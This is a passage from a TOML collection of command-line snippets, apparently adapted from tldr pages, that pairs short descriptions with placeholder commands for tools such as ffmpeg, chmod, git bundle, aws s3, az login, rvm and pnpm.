  description = "Specify a draft file containing the header and the body of the message, in RFC 5322 format"
  command = "neomutt -H <path/to/file> <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Search anime by name"
  command = "ani-cli ""<anime_name>"""
  output = ""

[[snippets]]
  description = "[d]ownload episode"
  command = "ani-cli -d ""<anime_name>"""
  output = ""

[[snippets]]
  description = "Use [v]LC as the media player"
  command = "ani-cli -v ""<anime_name>"""
  output = ""

[[snippets]]
  description = "Watch a specific [e]pisode"
  command = "ani-cli -e <episode_number> ""<anime_name>"""
  output = ""

[[snippets]]
  description = "[c]ontinue watching anime from history"
  command = "ani-cli -c"
  output = ""

[[snippets]]
  description = "[U]pdate `ani-cli`"
  command = "ani-cli -U"
  output = ""

[[snippets]]
  description = "Convert a graph from `mm` to `gv` format"
  command = "mm2gv -o <output.gv> <input.mm>"
  output = ""

[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.mm> | mm2gv > <output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mm2gv -?"
  output = ""

[[snippets]]
  description = "Display a 32-bit checksum, size in bytes and filename"
  command = "cksum <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a Python virtual environment"
  command = " python -m venv <path/to/virtual_environment>"
  output = ""

[[snippets]]
  description = "Activate the virtual environment (Linux and macOS)"
  command = "source <path/to/virtual_environment>/bin/activate"
  output = ""

[[snippets]]
  description = "Activate the virtual environment (Windows)"
  command = "<path\to\virtual_environment>\Scripts\activate.bat"
  output = ""

[[snippets]]
  description = "Deactivate the virtual environment"
  command = "deactivate"
  output = ""

[[snippets]]
  description = "Install Ghost in the current directory"
  command = "ghost install"
  output = ""

[[snippets]]
  description = "Start an instance of Ghost"
  command = "ghost start"
  output = ""

[[snippets]]
  description = "Restart the Ghost instance"
  command = "ghost restart"
  output = ""

[[snippets]]
  description = "Check the system for any potential hiccups while installing or updating Ghost"
  command = "ghost doctor"
  output = ""

[[snippets]]
  description = "View the logs of a Ghost instance"
  command = "ghost log <name>"
  output = ""

[[snippets]]
  description = "Run a Ghost instance directly (used by process managers and for debugging)"
  command = "ghost run"
  output = ""

[[snippets]]
  description = "View running Ghost processes"
  command = "ghost ls"
  output = ""

[[snippets]]
  description = "View or edit Ghost configuration"
  command = "ghost config <key> <value>"
  output = ""

[[snippets]]
  description = "Give the [u]ser who owns a file the right to e[x]ecute it"
  command = "chmod u+x <path/to/file>"
  output = ""

[[snippets]]
  description = "Give the [u]ser rights to [r]ead and [w]rite to a file/directory"
  command = "chmod u+rw <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Remove e[x]ecutable rights from the [g]roup"
  command = "chmod g-x <path/to/file>"
  output = ""

[[snippets]]
  description = "Give [a]ll users rights to [r]ead and e[x]ecute"
  command = "chmod a+rx <path/to/file>"
  output = ""

[[snippets]]
  description = "Give [o]thers (not in the file owner's group) the same rights as the [g]roup"
  command = "chmod o=g <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove all rights from [o]thers"
  command = "chmod o= <path/to/file>"
  output = ""

[[snippets]]
  description = "Change permissions recursively giving [g]roup and [o]thers the ability to [w]rite"
  command = "chmod -R g+w,o+w <path/to/directory>"
  output = ""

[[snippets]]
  description = "Recursively give [a]ll users [r]ead permissions to files and e[X]ecute permissions to sub-directories within a directory"
  command = "chmod -R a+rX <path/to/directory>"
  output = ""

[[snippets]]
  description = "Scan for possible queries using interactive mode"
  command = "sg scan --interactive"
  output = ""

[[snippets]]
  description = "Rewrite code in the current directory using patterns"
  command = "sg run --pattern '<foo>' --rewrite '<bar>' --lang <python>"
  output = ""

[[snippets]]
  description = "Visualize possible changes without applying them"
  command = "sg run --pattern '<useState<number>($A)>' --rewrite '<useState($A)>' --lang <typescript>"
  output = ""

[[snippets]]
  description = "Output results as JSON, extract information using `jq` and interactively view it using `jless`"
  command = "sg run --pattern '<Some($A)>' --rewrite '<None>' --json | jq '<.[].replacement>' | jless"
  output = ""

[[snippets]]
  description = "Display the root location of the current repository"
  command = "hg root"
  output = ""

[[snippets]]
  description = "Display the root location of the specified repository"
  command = "hg root --cwd <path/to/directory>"
  output = ""

[[snippets]]
  description = "List all supported import formats"
  command = "assimp listext"
  output = ""

[[snippets]]
  description = "List all supported export formats"
  command = "assimp listexport"
  output = ""

[[snippets]]
  description = "Convert a file to one of the supported output formats, using the default parameters"
  command = "assimp export <input_file.stl> <output_file.obj>"
  output = ""

[[snippets]]
  description = "Convert a file using custom parameters (the dox_cmd.h file in assimp's source code lists available parameters)"
  command = "assimp export <input_file.stl> <output_file.obj> <parameters>"
  output = ""

[[snippets]]
  description = "Display a summary of a 3D file's contents"
  command = "assimp info <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "assimp help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "assimp <subcommand> --help"
  output = ""

[[snippets]]
  description = "Initialize an (empty) repository"
  command = "vcsh init <repository_name>"
  output = ""

[[snippets]]
  description = "Clone a repository into a custom directory name"
  command = "vcsh clone <git_url> <repository_name>"
  output = ""

[[snippets]]
  description = "List all managed repositories"
  command = "vcsh list"
  output = ""

[[snippets]]
  description = "Execute a Git command on a managed repository"
  command = "vcsh <repository_name> <git_command>"
  output = ""

[[snippets]]
  description = "Push/pull all managed repositories to/from remotes"
  command = "vcsh <push|pull>"
  output = ""

[[snippets]]
  description = "Write a custom `.gitignore` file for a managed repository"
  command = "vcsh write-gitignore <repository_name>"
  output = ""

[[snippets]]
  description = "Edit a task, see `pueue status` to get the task ID"
  command = "pueue edit <task_id>"
  output = ""

[[snippets]]
  description = "Edit the path from which a task is executed"
  command = "pueue edit <task_id> --path"
  output = ""

[[snippets]]
  description = "Edit a command with the specified editor"
  command = "EDITOR=<nano> pueue edit <task_id>"
  output = ""

[[snippets]]
  description = "Generate a `Cargo.lock` file with the latest version of every package"
  command = "cargo generate-lockfile"
  output = ""

[[snippets]]
  description = "Get the actual file to which the symlink points"
  command = "readlink <path/to/file>"
  output = ""

[[snippets]]
  description = "Get the absolute path to a file"
  command = "readlink -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Vendor dependencies and configure `cargo` to use the vendored sources in the current project"
  command = "cargo vendor <path/to/directory> > .cargo/config.toml"
  output = ""

[[snippets]]
  description = "Show the current user's scheduled jobs"
  command = "atq"
  output = ""

[[snippets]]
  description = "Show jobs from the 'a' [q]ueue (queues have single-character names)"
  command = "atq -q <a>"
  output = ""

[[snippets]]
  description = "Show jobs of all users (run as superuser)"
  command = "sudo atq"
  output = ""

[[snippets]]
  description = "Initialize new module in current directory"
  command = "go mod init <moduleName>"
  output = ""

[[snippets]]
  description = "Download modules to local cache"
  command = "go mod download"
  output = ""

[[snippets]]
  description = "Add missing and remove unused modules"
  command = "go mod tidy"
  output = ""

[[snippets]]
  description = "Verify dependencies have expected content"
  command = "go mod verify"
  output = ""

[[snippets]]
  description = "Copy sources of all dependencies into the vendor directory"
  command = "go mod vendor"
  output = ""

[[snippets]]
  description = "Encode a WAV file to FLAC (this will create a FLAC file in the same location as the WAV file)"
  command = "flac <path/to/file.wav>"
  output = ""

[[snippets]]
  description = "Encode a WAV file to FLAC, specifying the output file"
  command = "flac -o <path/to/output.flac> <path/to/file.wav>"
  output = ""

[[snippets]]
  description = "Decode a FLAC file to WAV, specifying the output file"
  command = "flac -d -o <path/to/output.wav> <path/to/file.flac>"
  output = ""

[[snippets]]
  description = "Test a FLAC file for the correct encoding"
  command = "flac -t <path/to/file.flac>"
  output = ""

[[snippets]]
  description = "Check connection"
  command = "pg_isready"
  output = ""

[[snippets]]
  description = "Check connection with a specific hostname and port"
  command = "pg_isready --host=<hostname> --port=<port>"
  output = ""

[[snippets]]
  description = "Check connection displaying a message only when the connection fails"
  command = "pg_isready --quiet"
  output = ""

[[snippets]]
  description = "Display available fonts"
  command = "showfigfonts"
  output = ""

[[snippets]]
  description = "Display available fonts using a specific text"
  command = "showfigfonts <input_text>"
  output = ""

[[snippets]]
  description = "Log in interactively"
  command = "az login"
  output = ""

[[snippets]]
  description = "Log in with a service principal using a client secret"
  command = "az login --service-principal --username <http://azure-cli-service-principal> --password <secret> --tenant <someone.onmicrosoft.com>"
  output = ""

[[snippets]]
  description = "Log in with a service principal using a client certificate"
  command = "az login --service-principal --username <http://azure-cli-service-principal> --password <path/to/cert.pem> --tenant <someone.onmicrosoft.com>"
  output = ""

[[snippets]]
  description = "Log in using a VM's system assigned identity"
  command = "az login --identity"
  output = ""

[[snippets]]
  description = "Log in using a VM's user assigned identity"
  command = "az login --identity --username /subscriptions/<subscription_id>/resourcegroups/<my_rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<my_id>"
  output = ""

[[snippets]]
  description = "Install or update a specific toolchain (see `rustup help toolchain` for more information)"
  command = "rustup install <toolchain>"
  output = ""

[[snippets]]
  description = "Detect file(s) encoding according to the system's locale"
  command = "enca <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Detect file(s) encoding specifying a language in the POSIX/C locale format (e.g. zh_CN, en_US)"
  command = "enca -L <language> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Convert file(s) to a specific encoding"
  command = "enca -L <language> -x <to_encoding> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create a copy of an existing file using a different encoding"
  command = "enca -L <language> -x <to_encoding> < <original_file> > <new_file>"
  output = ""

[[snippets]]
  description = "Create a [N]ew certificate database in the current [d]irectory"
  command = "certutil -N -d ."
  output = ""

[[snippets]]
  description = "List all certificates in a database"
  command = "certutil -L -d ."
  output = ""

[[snippets]]
  description = "List all private [K]eys in a database specifying the password [f]ile"
  command = "certutil -K -d . -f <path/to/password_file.txt>"
  output = ""

[[snippets]]
  description = "[A]dd the signed certificate to the requesters database specifying a [n]ickname, [t]rust attributes and an [i]nput CRT file"
  command = "certutil -A -n ""<server_certificate>"" -t "",,"" -i <path/to/file.crt> -d ."
  output = ""

[[snippets]]
  description = "Add subject alternative names to a given [c]ertificate with a specific key size ([g])"
  command = "certutil -S -f <path/to/password_file.txt> -d . -t "",,"" -c ""<server_certificate>"" -n ""<server_name>"" -g <2048> -s ""CN=<common_name>,O=<organization>"""
  output = ""

[[snippets]]
  description = "Display logs and changes for recent commits"
  command = "git whatchanged"
  output = ""

[[snippets]]
  description = "Display logs and changes for recent commits within the specified time frame"
  command = "git whatchanged --since=""<2 hours ago>"""
  output = ""

[[snippets]]
  description = "Display logs and changes for recent commits for specific files or directories"
  command = "git whatchanged <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Print multiple files with a default header and footer"
  command = "pr <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print with a custom centered header"
  command = "pr -h ""<header>"" <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print with numbered lines and a custom date format"
  command = "pr -n -D ""<format>"" <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print all files together, one in each column, without a header or footer"
  command = "pr -m -T <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print, beginning at page 2 up to page 5, with a given page length (including header and footer)"
  command = "pr +<2>:<5> -l <page_length> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Print with an offset for each line and a truncating custom page width"
  command = "pr -o <offset> -W <width> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Initialize a `perlbrew` environment"
  command = "perlbrew init"
  output = ""

[[snippets]]
  description = "List available Perl versions"
  command = "perlbrew available"
  output = ""

[[snippets]]
  description = "Install/uninstall a Perl version"
  command = "perlbrew <install|uninstall> <version>"
  output = ""

[[snippets]]
  description = "List perl installations"
  command = "perlbrew list"
  output = ""

[[snippets]]
  description = "Switch to an installation and set it as default"
  command = "perlbrew switch perl-<version>"
  output = ""

[[snippets]]
  description = "Use the system Perl again"
  command = "perlbrew off"
  output = ""

[[snippets]]
  description = "List installed CPAN modules for the installation in use"
  command = "perlbrew list-modules"
  output = ""

[[snippets]]
  description = "Clone CPAN modules from one installation to another"
  command = "perlbrew clone-modules <source_installation> <destination_installation>"
  output = ""

[[snippets]]
  description = "Extract the sound from a video and save it as MP3"
  command = "ffmpeg -i <path/to/video.mp4> -vn <path/to/sound.mp3>"
  output = ""

[[snippets]]
  description = "Save a video as GIF, scaling the height to 1000px and setting framerate to 15"
  command = "ffmpeg -i <path/to/video.mp4> -vf 'scale=-1:<1000>' -r <15> <path/to/output.gif>"
  output = ""

[[snippets]]
  description = "Combine numbered images (`frame_1.jpg`, `frame_2.jpg`, etc) into a video or GIF"
  command = "ffmpeg -i <path/to/frame_%d.jpg> -f image2 <video.mpg|video.gif>"
  output = ""

[[snippets]]
  description = "Quickly extract a single frame from a video at time mm:ss and save it as a 128x128 resolution image"
  command = "ffmpeg -ss <mm:ss> -i <path/to/video.mp4> -frames 1 -s <128x128> -f image2 <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Trim a video from a given start time mm:ss to an end time mm2:ss2 (omit the -to flag to trim till the end)"
  command = "ffmpeg -ss <mm:ss> -to <mm2:ss2> -i <path/to/video.mp4> -codec copy <path/to/output.mp4>"
  output = ""

[[snippets]]
  description = "Convert AVI video to MP4. AAC Audio @ 128kbit, h264 Video @ CRF 23"
  command = "ffmpeg -i <path/to/input_video>.avi -codec:a aac -b:a 128k -codec:v libx264 -crf 23 <path/to/output_video>.mp4"
  output = ""

[[snippets]]
  description = "Remux MKV video to MP4 without re-encoding audio or video streams"
  command = "ffmpeg -i <path/to/input_video>.mkv -codec copy <path/to/output_video>.mp4"
  output = ""

[[snippets]]
  description = "Convert MP4 video to VP9 codec. For the best quality, use a CRF value (recommended range 15-35) and -b:v MUST be 0"
  command = "ffmpeg -i <path/to/input_video>.mp4 -codec:v libvpx-vp9 -crf <30> -b:v 0 -codec:a libopus -vbr on -threads <number_of_threads> <path/to/output_video>.webm"
  output = ""

[[snippets]]
  description = "Reformat a file"
  command = "fmt <path/to/file>"
  output = ""

[[snippets]]
  description = "Reformat a file producing output lines of (at most) `n` characters"
  command = "fmt -w <n> <path/to/file>"
  output = ""

[[snippets]]
  description = "Reformat a file without joining lines shorter than the given width together"
  command = "fmt -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Reformat a file with uniform spacing (1 space between words and 2 spaces between paragraphs)"
  command = "fmt -u <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply a function that performs autocompletion to a command"
  command = "complete -F <function> <command>"
  output = ""

[[snippets]]
  description = "Apply a command that performs autocompletion to another command"
  command = "complete -C <autocomplete_command> <command>"
  output = ""

[[snippets]]
  description = "Apply autocompletion without appending a space to the completed word"
  command = "complete -o nospace -F <function> <command>"
  output = ""

[[snippets]]
  description = "Log in to the balenaCloud account"
  command = "balena login"
  output = ""

[[snippets]]
  description = "Create a balenaCloud or openBalena application"
  command = "balena app create <app_name>"
  output = ""

[[snippets]]
  description = "List all balenaCloud or openBalena applications within the account"
  command = "balena apps"
  output = ""

[[snippets]]
  description = "List all devices associated with the balenaCloud or openBalena account"
  command = "balena devices"
  output = ""

[[snippets]]
  description = "Flash a balenaOS image to a local drive"
  command = "balena local flash <path/to/balenaos.img> --drive <drive_location>"
  output = ""

[[snippets]]
  description = "Convert a raster dataset to JPEG format"
  command = "gdal_translate -of <JPEG> <path/to/input.tif> <path/to/output.jpeg>"
  output = ""

[[snippets]]
  description = "Assign a projection to a raster dataset"
  command = "gdal_translate -a_srs <EPSG:4326> <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Reduce the size of a raster dataset to a specific fraction"
  command = "gdal_translate -outsize <40%> <40%> <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Convert a GeoTiff to a Cloud Optimized GeoTiff"
  command = "gdal_translate <path/to/input.tif> <path/to/output.tif> -of COG -co COMPRESS=LZW"
  output = ""

[[snippets]]
  description = "Install one or more versions of Ruby"
  command = "rvm install <version1 version2 ...>"
  output = ""

[[snippets]]
  description = "Display a list of installed versions"
  command = "rvm list"
  output = ""

[[snippets]]
  description = "Use a specific version of Ruby"
  command = "rvm use <version>"
  output = ""

[[snippets]]
  description = "Set the default Ruby version"
  command = "rvm --default use <version>"
  output = ""

[[snippets]]
  description = "Upgrade a version of Ruby to a new version"
  command = "rvm upgrade <current_version> <new_version>"
  output = ""

[[snippets]]
  description = "Uninstall a version of Ruby and keep its sources"
  command = "rvm uninstall <version>"
  output = ""

[[snippets]]
  description = "Remove a version of Ruby and its sources"
  command = "rvm remove <version>"
  output = ""

[[snippets]]
  description = "Show specific dependencies for your OS"
  command = "rvm requirements"
  output = ""

[[snippets]]
  description = "Convert a PS file to PNM images, storing page N of the input to `path/to/fileN.ppm`"
  command = "pstopnm <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Explicitly specify the output format"
  command = "pstopnm -<pbm|pgm|ppm> <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Specify the resolution of the output in dots per inch"
  command = "pstopnm -dpi <n> <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Verify a bundle and display detailed information about it"
  command = "bundletool validate --bundle=<path/to/bundle.aab>"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "pbzip2 <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a file using the specified number of processors"
  command = "pbzip2 -p<4> <path/to/file>"
  output = ""

[[snippets]]
  description = "[d]ecompress a file"
  command = "pbzip2 --decompress <path/to/compressed_file.bz2>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pbzip2 -h"
  output = ""

[[snippets]]
  description = "Run a Bash command on file creation, update or deletion"
  command = "fswatch <path/to/file> | xargs -n 1 <bash_command>"
  output = ""

[[snippets]]
  description = "Watch one or more files and/or directories"
  command = "fswatch <path/to/file> <path/to/directory> <path/to/another_directory/**/*.js> | xargs -n 1 <bash_command>"
  output = ""

[[snippets]]
  description = "Print the absolute paths of the changed files"
  command = "fswatch <path/to/directory> | xargs -n 1 -I {} echo {}"
  output = ""

[[snippets]]
  description = "Filter by event type"
  command = "fswatch --event <Updated|Deleted|Created> <path/to/directory> | xargs -n 1 <bash_command>"
  output = ""

[[snippets]]
  description = "Copy `stdin` to each file, and also to `stdout`"
  command = "echo ""example"" | tee <path/to/file>"
  output = ""

[[snippets]]
  description = "Append to the given files, do not overwrite"
  command = "echo ""example"" | tee -a <path/to/file>"
  output = ""

[[snippets]]
  description = "Print `stdin` to the terminal, and also pipe it into another program for further processing"
  command = "echo ""example"" | tee </dev/tty> | <xargs printf ""[%s]"">"
  output = ""

[[snippets]]
  description = "Create a directory called "example", count the number of characters in "example" and write "example" to the terminal"
  command = "echo ""example"" | tee >(xargs mkdir) >(wc -c)"
  output = ""

[[snippets]]
  description = "Run linters in the current folder"
  command = "golangci-lint run"
  output = ""

[[snippets]]
  description = "List enabled and disabled linters (Note: disabled linters are shown last, do not mistake them for enabled ones)"
  command = "golangci-lint linters"
  output = ""

[[snippets]]
  description = "[E]nable a specific linter for this run"
  command = "golangci-lint run --enable <linter>"
  output = ""

[[snippets]]
  description = "Display a calendar for the current month"
  command = "cal"
  output = ""

[[snippets]]
  description = "Display a calendar for a specific year"
  command = "cal <year>"
  output = ""

[[snippets]]
  description = "Display a calendar for a specific month and year"
  command = "cal <month> <year>"
  output = ""

[[snippets]]
  description = "Show files in a bucket"
  command = "aws s3 ls <bucket_name>"
  output = ""

[[snippets]]
  description = "Sync files and directories from local to bucket"
  command = "aws s3 sync <path/to/file1 path/to/file2 ...> s3://<bucket_name>"
  output = ""

[[snippets]]
  description = "Sync files and directories from bucket to local"
  command = "aws s3 sync s3://<bucket_name> <path/to/target>"
  output = ""

[[snippets]]
  description = "Sync files and directories with exclusions"
  command = "aws s3 sync <path/to/file1 path/to/file2 ...> s3://<bucket_name> --exclude <path/to/file> --exclude <path/to/directory>/*"
  output = ""

[[snippets]]
  description = "Remove file from bucket"
  command = "aws s3 rm s3://<bucket>/<path/to/file>"
  output = ""

[[snippets]]
  description = "Preview changes only"
  command = "aws s3 <any_command> --dryrun"
  output = ""

[[snippets]]
  description = "Update the year (range) to include the current year for the specified files"
  command = "mh_copyright --primary-entity=""<entity>"" --update-year <path/to/file_or_directory1.m path/to/file_or_director2.m ...>"
  output = ""

[[snippets]]
  description = "Update the year (range) to include the current year for all files"
  command = "mh_copyright --primary-entity=""<entity>"" --update-year"
  output = ""

[[snippets]]
  description = "Start the GUI"
  command = "git cola"
  output = ""

[[snippets]]
  description = "Start the GUI in amend mode"
  command = "git cola --amend"
  output = ""

[[snippets]]
  description = "Prompt for a Git repository. Defaults to the current directory"
  command = "git cola --prompt"
  output = ""

[[snippets]]
  description = "Open the Git repository at mentioned path"
  command = "git cola --repo <path/to/git-repository>"
  output = ""

[[snippets]]
  description = "Apply the path filter to the status widget"
  command = "git cola --status-filter <filter>"
  output = ""

[[snippets]]
  description = "Create a shaded scatter plot of points and save it to a png file and set the background color"
  command = "datashader_cli points <path/to/input.parquet> --x <pickup_x> --y <pickup_y> <path/to/output.png> --background <black|white|#rrggbb>"
  output = ""

[[snippets]]
  description = "Visualize the geospatial data (supports Geoparquet, shapefile, geojson, geopackage, etc.)"
  command = "datashader_cli points <path/to/input_data.geo.parquet> <path/to/output_data.png> --geo true"
  output = ""

[[snippets]]
  description = "Use matplotlib to render the image"
  command = "datashader_cli points <path/to/input_data.geo.parquet> <path/to/output_data.png> --geo <true> --matplotlib true"
  output = ""

[[snippets]]
  description = "Run `sleep 10` and terminate it after 3 seconds"
  command = "timeout 3s sleep 10"
  output = ""

[[snippets]]
  description = "Send a signal to the command after the time limit expires (SIGTERM by default)"
  command = "timeout --signal <INT> <5s> <sleep 10>"
  output = ""

[[snippets]]
  description = "Create a bundle file that contains all objects and references of a specific branch"
  command = "git bundle create <path/to/file.bundle> <branch_name>"
  output = ""

[[snippets]]
  description = "Create a bundle file of all branches"
  command = "git bundle create <path/to/file.bundle> --all"
  output = ""

[[snippets]]
  description = "Create a bundle file of the last 5 commits of the current branch"
  command = "git bundle create <path/to/file.bundle> -<5> <HEAD>"
  output = ""

[[snippets]]
  description = "Create a bundle file of the latest 7 days"
  command = "git bundle create <path/to/file.bundle> --since=<7.days> <HEAD>"
  output = ""

[[snippets]]
  description = "Verify that a bundle file is valid and can be applied to the current repository"
  command = "git bundle verify <path/to/file.bundle>"
  output = ""

[[snippets]]
  description = "Print to `stdout` the list of references contained in a bundle"
  command = "git bundle unbundle <path/to/file.bundle>"
  output = ""

[[snippets]]
  description = "Unbundle a specific branch from a bundle file into the current repository"
  command = "git pull <path/to/file.bundle> <branch_name>"
  output = ""

[[snippets]]
  description = "List all reverse socket connections from emulators and devices"
  command = "adb reverse --list"
  output = ""

[[snippets]]
  description = "Reverse a TCP port from an emulator or device to localhost"
  command = "adb reverse tcp:<remote_port> tcp:<local_port>"
  output = ""

[[snippets]]
  description = "Remove a reverse socket connections from an emulator or device"
  command = "adb reverse --remove tcp:<remote_port>"
  output = ""

[[snippets]]
  description = "Remove all reverse socket connections from all emulators and devices"
  command = "adb reverse --remove-all"
  output = ""

[[snippets]]
  description = "Convert a PDF file to JPEG"
  command = "pdftocairo <path/to/file.pdf> -jpeg"
  output = ""

[[snippets]]
  description = "Convert to PDF expanding the output to fill the paper"
  command = "pdftocairo <path/to/file.pdf> <output.pdf> -pdf -expand"
  output = ""

[[snippets]]
  description = "Convert to SVG specifying the first/last page to convert"
  command = "pdftocairo <path/to/file.pdf> <output.svg> -svg -f <first_page> -l <last_page>"
  output = ""

[[snippets]]
  description = "Convert to PNG with 200ppi resolution"
  command = "pdftocairo <path/to/file.pdf> <output.png> -png -r 200"
  output = ""

[[snippets]]
  description = "Convert to grayscale TIFF setting paper size to A3"
  command = "pdftocairo <path/to/file.pdf> -tiff -gray -paper A3"
  output = ""

[[snippets]]
  description = "Convert to PNG cropping x and y pixels from the top-left corner"
  command = "pdftocairo <path/to/file.pdf> -png -x <x_pixels> -y <y_pixels>"
  output = ""

[[snippets]]
  description = "Serve a directory"
  command = "miniserve <path/to/directory>"
  output = ""

[[snippets]]
  description = "Serve a single file"
  command = "miniserve <path/to/file>"
  output = ""

[[snippets]]
  description = "Serve a directory using HTTP basic authentication"
  command = "miniserve --auth <username>:<password> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Run a basic benchmark, performing at least 10 runs"
  command = "hyperfine '<make>'"
  output = ""

[[snippets]]
  description = "Run a comparative benchmark"
  command = "hyperfine '<make target1>' '<make target2>'"
  output = ""

[[snippets]]
  description = "Change minimum number of benchmarking runs"
  command = "hyperfine --min-runs <7> '<make>'"
  output = ""

[[snippets]]
  description = "Perform benchmark with warmup"
  command = "hyperfine --warmup <5> '<make>'"
  output = ""

[[snippets]]
  description = "Run a command before each benchmark run (to clear caches, etc.)"
  command = "hyperfine --prepare '<make clean>' '<make>'"
  output = ""

[[snippets]]
  description = "Run a benchmark where a single parameter changes for each run"
  command = "hyperfine --prepare '<make clean>' --parameter-scan <num_threads> <1> <10> '<make -j {num_threads>}'"
  output = ""

[[snippets]]
  description = "Create the global configuration directory"
  command = "terminalizer init"
  output = ""

[[snippets]]
  description = "Record the terminal and create a recording file"
  command = "terminalizer record <path/to/recording.gif>"
  output = ""

[[snippets]]
  description = "Play a recorded file on the terminal"
  command = "terminalizer play <path/to/recording.gif>"
  output = ""

[[snippets]]
  description = "Render a recording file as an animated GIF image"
  command = "terminalizer render <path/to/recording.gif>"
  output = ""

[[snippets]]
  description = "Upload a video to <https://terminalizer.com>"
  command = "terminalizer share <path/to/recording.gif>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "racket"
  output = ""

[[snippets]]
  description = "Execute a Racket script"
  command = "racket <path/to/script.rkt>"
  output = ""

[[snippets]]
  description = "Execute a Racket expression"
  command = "racket --eval ""<expression>"""
  output = ""

[[snippets]]
  description = "Run module as a script (terminates option list)"
  command = "racket --lib <module_name> --main <arguments>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell) for the `typed/racket` hashlang"
  command = "racket -I typed/racket"
  output = ""

[[snippets]]
  description = "Add files to a changelist, creating the changelist if it does not exist"
  command = "svn changelist <changelist_name> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Remove files from a changelist"
  command = "svn changelist --remove <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Remove the whole changelist at once"
  command = "svn changelist --remove --recursive --changelist <changelist_name> ."
  output = ""

[[snippets]]
  description = "Add the contents of a space-separated list of directories to a changelist"
  command = "svn changelist --recursive <changelist_name> <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Commit a changelist"
  command = "svn commit --changelist <changelist_name>"
  output = ""

[[snippets]]
  description = "Convert an STL file to an OBJ file"
  command = "meshlabserver -i <input.stl> -o <output.obj>"
  output = ""

[[snippets]]
  description = "Convert a WRL file to a OFF file, including the vertex and face normals in the output mesh"
  command = "meshlabserver -i <input.wrl> -o <output.off> -om vn fn"
  output = ""

[[snippets]]
  description = "Dump a list of all the available processing filters into a file"
  command = "meshlabserver -d <path/to/file>"
  output = ""

[[snippets]]
  description = "Process a 3D file using a filter script created in the MeshLab GUI (Filters > Show current filter script > Save Script)"
  command = "meshlabserver -i <input.ply> -o <output.ply> -s <filter_script.mlx>"
  output = ""

[[snippets]]
  description = "Process a 3D file using a filter script, writing the output of the filters into a log file"
  command = "meshlabserver -i <input.x3d> -o <output.x3d> -s <filter_script.mlx> -l <logfile>"
  output = ""

[[snippets]]
  description = "Show instances created by current user"
  command = "show instances;"
  output = ""

[[snippets]]
  description = "Describe the details of an instance"
  command = "desc instance <instance_id>;"
  output = ""

[[snippets]]
  description = "Check the status of an instance"
  command = "status <instance_id>;"
  output = ""

[[snippets]]
  description = "Wait on the termination of an instance, printing log and progress information until then"
  command = "wait <instance_id>;"
  output = ""

[[snippets]]
  description = "Kill an instance"
  command = "kill <instance_id>;"
  output = ""

[[snippets]]
  description = "Open a web page to start a bug report"
  command = "go bug"
  output = ""

[[snippets]]
  description = "Generate a PBM file as output for a Xerox doodle brush file as input"
  command = "brushtopbm <path/to/file.brush>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "brushtopbm -version"
  output = ""

[[snippets]]
  description = "Show the default paper size used by all TeX Live programs"
  command = "tlmgr paper"
  output = ""

[[snippets]]
  description = "Set the default paper size for all TeX Live programs to A4"
  command = "sudo tlmgr paper <a4>"
  output = ""

[[snippets]]
  description = "Show the default paper size used by a specific TeX Live program"
  command = "tlmgr <pdftex> paper"
  output = ""

[[snippets]]
  description = "Set the default paper size for a specific TeX Live program to A4"
  command = "sudo tlmgr <pdftex> paper <a4>"
  output = ""

[[snippets]]
  description = "List all available paper sizes for a specific TeX Live program"
  command = "tlmgr <pdftex> paper --list"
  output = ""

[[snippets]]
  description = "Dump the default paper size used by all TeX Live programs in JSON format"
  command = "tlmgr paper --json"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "nu"
  output = ""

[[snippets]]
  description = "Execute specific commands"
  command = "nu --commands ""<echo 'nu is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "nu <path/to/script.nu>"
  output = ""

[[snippets]]
  description = "Execute a specific script with logging"
  command = "nu --log-level <error|warn|info|debug|trace> <path/to/script.nu>"
  output = ""

[[snippets]]
  description = "Create a `package.json` file"
  command = "pnpm init"
  output = ""

[[snippets]]
  description = "Download all the packages listed as dependencies in `package.json`"
  command = "pnpm install"
  output = ""

[[snippets]]
  description = "Download a specific version of a package and add it to the list of dependencies in `package.json`"
  command = "pnpm add <module_name>@<version>"
  output = ""

[[snippets]]
